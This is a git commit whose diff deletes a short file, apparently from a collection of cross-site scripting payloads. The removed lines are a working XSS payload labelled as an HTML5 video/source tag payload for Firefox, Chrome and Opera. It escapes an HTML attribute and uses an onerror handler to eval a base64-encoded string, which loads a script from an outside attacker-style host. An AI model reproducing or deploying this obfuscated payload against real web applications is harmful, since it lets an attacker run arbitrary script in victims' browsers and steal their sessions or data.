98f754bf2e2d75e239b35ff55fc532663a932893
Bimal Kumar Sahoo <60147925+srb1mal@users.noreply.github.com>
2024-09-17 14:26:40 +0530

    Delete 5.js

--- 5.js
+++
@@ -1,3 +0,0 @@
-"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vc29tdGhlaGFjazNyeHNzaHQueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61;>
-
-###<video><source> Tag Payload - HTML5 payload, only works in Firefox, Chrome and Opera
